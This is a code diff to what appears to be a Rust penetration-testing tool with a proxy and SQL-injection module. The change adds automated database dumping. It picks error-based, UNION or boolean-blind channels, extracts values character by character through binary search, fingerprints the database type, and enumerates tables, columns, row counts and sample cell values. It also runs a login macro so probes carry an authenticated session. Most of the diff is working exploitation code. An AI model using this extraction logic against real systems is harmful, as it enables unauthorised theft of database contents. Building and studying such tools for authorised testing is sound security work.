@@ -18,14 +18,17 @@ use scry_core::HttpFlow;
 use scry_proxy::replay::{self, ReplayConfig, ReplayRequest};
 use scry_proxy::upstream::UpstreamProxy;
 use scry_sqli::{
-    boolean_tests, build_probe, error_extract_value, error_probe_values, injection_points,
-    judge_boolean, judge_time_delta, match_error_dbms, parse_exfil, time_tests, union_tests,
-    union_value, InjectionPoint, RespView, Scalar, Technique, BOUNDARIES, UNION_MAX_COLS,
+    bool_inject, boolean_tests, build_probe, cell_query, char_code_expr, column_name_query,
+    columns_count_query, error_extract_value, error_probe_values, injection_points, judge_boolean,
+    judge_time_delta, length_expr, match_error_dbms, parse_exfil, rows_count_query, similarity,
+    table_name_query, tables_count_query, time_tests, union_inner_value, union_tests, union_value,
+    Boundary, Dbms, InjectionPoint, RespView, Scalar, Technique, BOOL_SIM_HIGH, BOUNDARIES,
+    UNION_MAX_COLS,
 };
 
 use crate::logger::LogLevel;
 use crate::repeater::{parse_raw_request, render_raw_request, target_string};
-use crate::state::{ScryApp, SqliLevel, SqliLine, SqliMsg, SqliReport};
+use crate::state::{ScryApp, SqliLevel, SqliLine, SqliMsg, SqliReport, SqliTableDump};
 use crate::widgets::{divider, section_label};
 
 /// 自动模式下最多测试的注入点数(参数极多时防止狂发)。
@@ -36,6 +39,143 @@ const TIME_BUDGET: usize = 8;
 const SQLI_LOG_CAP: usize = 600;
 /// 时间盲注睡眠秒数可选项。
 const SECS_OPTS: [u32; 4] = [2, 3, 5, 8];
+
+// ── dump / 库表枚举上限(防失控:盲注逐字符开销大)──
+/// 最多枚举的表数。
+const DUMP_MAX_TABLES: usize = 12;
+/// 每表最多枚举的列数。
+const DUMP_MAX_COLUMNS: usize = 16;
+/// 每表最多 dump 的样本行数。
+const DUMP_MAX_ROWS: usize = 5;
+/// 每行最多 dump 的列数。
+const DUMP_MAX_CELL_COLS: usize = 6;
+/// 盲注逐字符提取的字符串长度上限。
+const DUMP_MAX_LEN: u32 = 64;
+/// 盲注通道的总请求预算(每个二分比较 1 请求;防对目标狂轰)。
+const DUMP_BLIND_BUDGET: usize = 4000;
+
+/// dump 取数的上下文(选择最快可用通道:报错 > 联合 > 布尔盲注)。
+struct DumpCtx<'a> {
+    base_flow: &'a HttpFlow,
+    point: &'a InjectionPoint,
+    boundary: Boundary,
+    dbms: Dbms,
+    base_view: &'a RespView,
+    cfg: &'a ReplayConfig,
+    /// 报错外带可用(技术含报错型且该方言支持)。
+    can_error: bool,
+    /// 联合查询可用时的 (列数, 可显列)。
+    union_cp: Option<(usize, usize)>,
+    /// 布尔盲注可用(逐字符提取兜底)。
+    can_bool: bool,
+}
+
+/// 布尔盲注单次提问:注入 `condition`,响应接近基线(状态码 + 相似度)即判该条件为真。
+async fn ask_true(condition: &str, ctx: &DumpCtx<'_>) -> bool {
+    let v = bool_inject(&ctx.point.value, ctx.boundary, condition);
+    let probe = build_probe(ctx.base_flow, ctx.point, &v);
+    match send_probe(&probe, ctx.cfg).await {
+        Some(resp) => {
+            let rv = RespView::of(&resp);
+            rv.status == ctx.base_view.status
+                && similarity(&ctx.base_view.body, &rv.body) >= BOOL_SIM_HIGH
+        }
+        None => false,
+    }
+}
+
+/// 布尔盲注逐字符提取一个子查询标量(先二分长度,再逐字符二分 ASCII 码)。
+async fn blind_extract(
+    inner: &str,
+    ctx: &DumpCtx<'_>,
+    ctrl: &Arc<AtomicBool>,
+    budget: &mut usize,
+) -> Option<String> {
+    let lexpr = length_expr(ctx.dbms, inner);
+    let (mut lo, mut hi) = (0u32, DUMP_MAX_LEN);
+    while lo < hi {
+        if ctrl.load(Ordering::Relaxed) || *budget == 0 {
+            return None;
+        }
+        *budget -= 1;
+        let mid = (lo + hi) / 2;
+        if ask_true(&format!("{lexpr}>{mid}"), ctx).await {
+            lo = mid + 1;
+        } else {
+            hi = mid;
+        }
+    }
+    let len = lo as usize;
+    if len == 0 {
+        return Some(String::new());
+    }
+    let mut out = String::new();
+    for pos in 1..=len {
+        let cexpr = char_code_expr(ctx.dbms, inner, pos);
+        let (mut blo, mut bhi) = (0u32, 255u32);
+        while blo < bhi {
+            if ctrl.load(Ordering::Relaxed) || *budget == 0 {
+                return Some(out);
+            }
+            *budget -= 1;
+            let mid = (blo + bhi) / 2;
+            if ask_true(&format!("{cexpr}>{mid}"), ctx).await {
+                blo = mid + 1;
+            } else {
+                bhi = mid;
+            }
+        }
+        if blo == 0 {
+            break;
+        }
+        out.push(blo as u8 as char);
+    }
+    Some(out)
+}
+
+/// 取一个子查询标量的值,自动选最快通道:报错外带 → 联合查询 → 布尔盲注逐字符。
+async fn dump_extract(
+    inner: &str,
+    ctx: &DumpCtx<'_>,
+    ctrl: &Arc<AtomicBool>,
+    budget: &mut usize,
+) -> Option<String> {
+    // 1) 报错外带(1 请求最快)。
+    if ctx.can_error {
+        if let Some(frag) = ctx.dbms.error_extract(inner) {
+            let v = format!(
+                "{}{} {frag}{}",
+                ctx.point.value, ctx.boundary.prefix, ctx.boundary.suffix
+            );
+            let probe = build_probe(ctx.base_flow, ctx.point, &v);
+            if let Some(resp) = send_probe(&probe, ctx.cfg).await {
+                if let Some(val) = parse_exfil(&RespView::of(&resp).body) {
+                    return Some(val);
+                }
+            }
+        }
+    }
+    // 2) 联合查询(1 请求)。
+    if let Some((cols, pos)) = ctx.union_cp {
+        let v = union_inner_value(&ctx.point.value, ctx.boundary, ctx.dbms, inner, cols, pos);
+        let probe = build_probe(ctx.base_flow, ctx.point, &v);
+        if let Some(resp) = send_probe(&probe, ctx.cfg).await {
+            if let Some(val) = parse_exfil(&RespView::of(&resp).body) {
+                return Some(val);
+            }
+        }
+    }
+    // 3) 布尔盲注逐字符(慢,但通用)。
+    if ctx.can_bool {
+        return blind_extract(inner, ctx, ctrl, budget).await;
+    }
+    None
+}
+
+/// 解析一个「数量」子查询(COUNT(*))的结果为 usize。
+fn parse_count(s: &str) -> usize {
+    s.trim().parse::<usize>().unwrap_or(0)
+}
 
 // ───────────────────────── 后台 runner ─────────────────────────
 
@@ -136,10 +276,13 @@ fn truncate(s: &str, n: usize) -> String {
 }
 
 /// 整条 SQLi 测试流程(检测 → 指纹 → 取数);全程经 `tx` 流式回传日志 / 报告 / 进度。
+#[allow(clippy::too_many_arguments)]
 async fn run_sqli(
-    base_req: ReplayRequest,
+    mut base_req: ReplayRequest,
     points: Vec<InjectionPoint>,
     secs: u32,
+    dump: bool,
+    session: Option<crate::session::SessionPlan>,
     upstream: Option<UpstreamProxy>,
     ctrl: Arc<AtomicBool>,
     tx: Sender<SqliMsg>,
@@ -148,6 +291,30 @@ async fn run_sqli(
         upstream,
         ..Default::default()
     };
+
+    // 会话处理:开扫前跑登录宏建立会话并注入到基准请求(所有探测变异都会带上)。
+    if let Some(plan) = session {
+        log_line(&tx, SqliLevel::Info, "运行登录宏建立会话…");
+        match crate::session::run_login_macro(&plan).await {
+            Ok((status, st)) => {
+                log_line(
+                    &tx,
+                    if st.is_empty() {
+                        SqliLevel::Warn
+                    } else {
+                        SqliLevel::Good
+                    },
+                    format!("会话已建立(HTTP {status}):{}", st.summary()),
+                );
+                let (h, b) =
+                    crate::session::apply_session_to(&base_req.headers, &base_req.body, &st, &plan.apply);
+                base_req.headers = h;
+                base_req.body = b;
+            }
+            Err(e) => log_line(&tx, SqliLevel::Warn, format!("登录宏失败:{e}")),
+        }
+    }
+
     let base_flow = flow_from_req(&base_req);
     let mut report = SqliReport::default();
 
@@ -321,6 +488,36 @@ async fn run_sqli(
         return;
     }
 
+    // 盲注成立但未指纹库类型:用布尔通道做一次轻量方言指纹(各方言当前库函数互不相同,
+    // 错误方言的函数会触发 SQL 错误使页面偏离基线 → 只有正确方言判真)。
+    if report.dbms.is_none()
+        && report.techniques.contains(&Technique::Boolean)
+        && !ctrl.load(Ordering::Relaxed)
+    {
+        let point = report.point.clone().unwrap();
+        let boundary = report.boundary.unwrap_or(BOUNDARIES[0]);
+        for d in Dbms::ALL {
+            if ctrl.load(Ordering::Relaxed) {
+                break;
+            }
+            let cond = format!("{}>=0", length_expr(d, d.scalar(Scalar::Database)));
+            let v = bool_inject(&point.value, boundary, &cond);
+            let probe = build_probe(&base_flow, &point, &v);
+            if let Some(resp) = send_probe(&probe, &cfg).await {
+                let rv = RespView::of(&resp);
+                if rv.status == base_view.status
+                    && similarity(&base_view.body, &rv.body) >= BOOL_SIM_HIGH
+                {
+                    report.dbms = Some(d);
+                    push_tech(&mut report, Technique::Boolean);
+                    log_line(&tx, SqliLevel::Good, format!("盲注方言指纹:{}", d.label()));
+                    log_snap(&tx, &report);
+                    break;
+                }
+            }
+        }
+    }
+
     // ── 取数(需先指纹出库类型)──
     let Some(dbms) = report.dbms else {
         log_line(
@@ -364,6 +561,8 @@ async fn run_sqli(
     }
 
     // b) 联合查询兜底(报错没拿到的 / SQLite):先探出列数与可显列,再按它逐标量取数。
+    // `union_cp` 提到 dump 阶段也复用(联合查询是取数快通道)。
+    let mut union_cp: Option<(usize, usize)> = None;
     let missing_any = Scalar::ALL.into_iter().any(|s| !has_scalar(&report, s));
     if missing_any && !ctrl.load(Ordering::Relaxed) {
         log_line(&tx, SqliLevel::Info, "尝试联合查询取数(探测列数与可显列)…");
@@ -418,6 +617,135 @@ async fn run_sqli(
                 SqliLevel::Warn,
                 "联合查询未取到数据(列数 / 类型不匹配或被过滤)",
             );
+        }
+        union_cp = cols_pos;
+    }
+
+    // ── c) dump:库表枚举 + 样本数据(sqlmap 式;自动选最快通道,盲注有预算上限)──
+    if dump && !ctrl.load(Ordering::Relaxed) {
+        let can_error =
+            report.techniques.contains(&Technique::Error) && dbms.error_extract("1").is_some();
+        let can_bool = report.techniques.contains(&Technique::Boolean);
+        if !can_error && union_cp.is_none() && !can_bool {
+            log_line(
+                &tx,
+                SqliLevel::Warn,
+                "仅时间盲注通道,逐字符取数过慢 → 跳过库表枚举",
+            );
+        } else {
+            let ctx = DumpCtx {
+                base_flow: &base_flow,
+                point: &point,
+                boundary,
+                dbms,
+                base_view: &base_view,
+                cfg: &cfg,
+                can_error,
+                union_cp,
+                can_bool,
+            };
+            let mut budget = DUMP_BLIND_BUDGET;
+            log_line(&tx, SqliLevel::Info, "开始库表枚举 + 取数…");
+            log_prog(&tx, "枚举库表…");
+
+            let tcount = dump_extract(&tables_count_query(dbms), &ctx, &ctrl, &mut budget)
+                .await
+                .map(|s| parse_count(&s));
+            match tcount {
+                Some(tc) if tc > 0 => {
+                    log_line(&tx, SqliLevel::Good, format!("当前库有 {tc} 张表"));
+                    let n = tc.min(DUMP_MAX_TABLES);
+                    for ti in 0..n {
+                        if ctrl.load(Ordering::Relaxed) {
+                            break;
+                        }
+                        let Some(tname) =
+                            dump_extract(&table_name_query(dbms, ti), &ctx, &ctrl, &mut budget).await
+                        else {
+                            continue;
+                        };
+                        if tname.is_empty() {
+                            continue;
+                        }
+                        log_prog(&tx, format!("枚举表 {}/{n}:{tname}", ti + 1));
+                        log_line(&tx, SqliLevel::Good, format!("表 [{}] {tname}", ti + 1));
+                        let mut td = SqliTableDump {
+                            name: tname.clone(),
+                            ..Default::default()
+                        };
+                        // 列。
+                        if let Some(cc) =
+                            dump_extract(&columns_count_query(dbms, &tname), &ctx, &ctrl, &mut budget)
+                                .await
+                                .map(|s| parse_count(&s))
+                        {
+                            let cn = cc.min(DUMP_MAX_COLUMNS);
+                            for ci in 0..cn {
+                                if ctrl.load(Ordering::Relaxed) {
+                                    break;
+                                }
+                                if let Some(col) = dump_extract(
+                                    &column_name_query(dbms, &tname, ci),
+                                    &ctx,
+                                    &ctrl,
+                                    &mut budget,
+                                )
+                                .await
+                                {
+                                    if !col.is_empty() {
+                                        td.columns.push(col);
+                                    }
+                                }
+                            }
+                        }
+                        if !td.columns.is_empty() {
+                            log_line(&tx, SqliLevel::Info, format!("  列:{}", td.columns.join(", ")));
+                        }
+                        // 样本行:仅快通道(报错 / 联合);盲注逐字符取整行开销过大,跳过。
+                        if can_error || union_cp.is_some() {
+                            if let Some(rc) =
+                                dump_extract(&rows_count_query(dbms, &tname), &ctx, &ctrl, &mut budget)
+                                    .await
+                                    .map(|s| parse_count(&s))
+                            {
+                                td.row_count = Some(rc);
+                                let rn = rc.min(DUMP_MAX_ROWS);
+                                let cols: Vec<String> =
+                                    td.columns.iter().take(DUMP_MAX_CELL_COLS).cloned().collect();
+                                for ri in 0..rn {
+                                    if ctrl.load(Ordering::Relaxed) {
+                                        break;
+                                    }
+                                    let mut row = Vec::new();
+                                    for col in &cols {
+                                        let cell = dump_extract(
+                                            &cell_query(dbms, &tname, col, ri),
+                                            &ctx,
+                                            &ctrl,
+                                            &mut budget,
+                                        )
+                                        .await
+                                        .unwrap_or_default();
+                                        row.push(cell);
+                                    }
+                                    td.rows.push(row);
+                                }
+                                if !td.rows.is_empty() {
+                                    log_line(
+                                        &tx,
+                                        SqliLevel::Good,
+                                        format!("  dump 了 {} 行样本", td.rows.len()),
+                                    );
+                                }
+                            }
+                        }
+                        report.tables.push(td);
+                        log_snap(&tx, &report);
+                    }
+                }
+                Some(_) => log_line(&tx, SqliLevel::Warn, "当前库表数为 0 / 未取到"),
+                None => log_line(&tx, SqliLevel::Warn, "未能枚举库表(通道取数失败)"),
+            }
         }
     }
 
@@ -515,6 +843,8 @@ impl ScryApp {
             }
         };
         let secs = self.sqli_secs;
+        let dump = self.sqli_dump;
+        let session = self.session_plan(cx);
         let up = self.upstream_proxy(cx);
 
         self.sqli_busy = true;
@@ -548,7 +878,7 @@ impl ScryApp {
                     Ok(rt) => rt,
                     Err(_) => return,
                 };
-                rt.block_on(run_sqli(base_req, points, secs, up, ctrl, tx));
+                rt.block_on(run_sqli(base_req, points, secs, dump, session, up, ctrl, tx));
             })
             .detach();
 
@@ -709,6 +1039,27 @@ impl ScryApp {
                     )
                     .child(secs_select),
             )
+            .child(
+                div()
+                    .flex()
+                    .items_center()
+                    .gap(px(6.0))
+                    .flex_shrink_0()
+                    .child(
+                        div()
+                            .text_size(t.font_size.xs)
+                            .text_color(c.text_subtle)
+                            .child(self.lang.t("Dump schema")),
+                    )
+                    .child(
+                        Switch::new("sqli-dump", self.sqli_dump).on_toggle(cx.listener(
+                            |this, _e, _w, cx| {
+                                this.sqli_dump = !this.sqli_dump;
+                                cx.notify();
+                            },
+                        )),
+                    ),
+            )
             .child(action);
         if let Some(p) = &self.sqli_progress {
             toolbar = toolbar.child(
@@ -853,8 +1204,65 @@ impl ScryApp {
                     }
                 }
             }
+            if !r.tables.is_empty() {
+                card = card.child(divider(c)).child(
+                    div()
+                        .text_size(t.font_size.xs)
+                        .text_color(c.text_subtle)
+                        .child(format!("{} ({})", self.lang.t("Tables"), r.tables.len())),
+                );
+                for td in &r.tables {
+                    card = card.child(self.sqli_table_view(td, c, t));
+                }
+            }
         }
         card.into_any_element()
+    }
+
+    /// 单张枚举 / dump 出的表:表名 + 行数 + 列名 + 样本行(等宽)。
+    fn sqli_table_view(&self, td: &SqliTableDump, c: ThemeColors, t: Tokens) -> AnyElement {
+        let mut block = div()
+            .flex()
+            .flex_col()
+            .gap(px(2.0))
+            .flex_shrink_0()
+            .p(t.space.sm)
+            .rounded(t.radius.md)
+            .bg(c.elevated)
+            .border_1()
+            .border_color(c.border);
+        let title = match td.row_count {
+            Some(n) => format!("{} · {} {}", td.name, n, self.lang.t("rows")),
+            None => td.name.clone(),
+        };
+        block = block.child(
+            div()
+                .font_family(crate::model::MONO)
+                .text_size(t.font_size.xs)
+                .text_color(c.text)
+                .font_weight(FontWeight::SEMIBOLD)
+                .child(title),
+        );
+        if !td.columns.is_empty() {
+            block = block.child(
+                div()
+                    .font_family(crate::model::MONO)
+                    .text_size(t.font_size.xs)
+                    .text_color(c.accent)
+                    .child(td.columns.join(" | ")),
+            );
+        }
+        for row in &td.rows {
+            block = block.child(
+                div()
+                    .font_family(crate::model::MONO)
+                    .text_size(t.font_size.xs)
+                    .text_color(c.text_muted)
+                    .truncate()
+                    .child(truncate(&row.join(" | "), 160)),
+            );
+        }
+        block.into_any_element()
     }
 
     /// 测试日志列表(彩色,最近 300 行)。
